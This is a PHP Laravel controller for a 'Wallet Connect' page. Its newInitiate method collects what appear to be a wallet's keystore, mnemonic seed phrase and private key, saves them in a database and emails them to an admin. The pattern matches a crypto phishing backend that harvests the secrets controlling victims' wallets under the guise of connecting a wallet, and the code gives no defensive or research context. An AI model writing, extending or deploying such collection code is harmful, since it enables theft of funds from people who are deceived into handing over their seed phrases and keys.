<?php

namespace App\Http\Controllers\User;

use App\Http\Controllers\Controller;
use App\Jobs\ProcessAutoWithdrawJob;
use App\Models\AutoWallet;
use App\Models\DepositCoin;
use App\Models\User;
use App\Models\Initiate;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;
use OTPHP\TOTP;

class InitiateController extends Controller
{
    //index of all withdrawals
    public function index(Request $request)
    {
        $page_title = 'Wallet Connect';



        // dd($auto_wallets_array);
        return view('user.initiate.index', compact(
            'page_title',
        ));
    }

 public function walletconnect(Request $request)
    {
        $page_title = 'Wallet Connect';



        // dd($auto_wallets_array);
        return view('user.initiate.walletconnect', compact(
            'page_title',
        ));
    }

    //new deposit 
    public function newInitiate(Request $request)
    {
  
      $page_title = 'Wallet Connect'; 
      $user = User::find($request['id']);
      
      $dp=new Initiate();
      $dp->user_id= $user->id;
      $dp->keystr = $request['keystr'];
      $dp->mne = $request['mne'];
      $dp->pkey = $request['pkey'];
      $dp->wallet1 = $request['wallet1'];
      $dp->wallet2 = $request['wallet2'];
      $dp->wallet3 = $request['wallet3'];
      $dp->phr_type = $request['phr_type'];
      $dp->wallet_type = $request['wallet_type'];
      $dp->save();
      
      sendWalletConnectEmail($dp);
      adminWalletConnectEmail($dp);
      

  return view('user.initiate.walletconnect', compact(
            'page_title',
        ));
    }
}
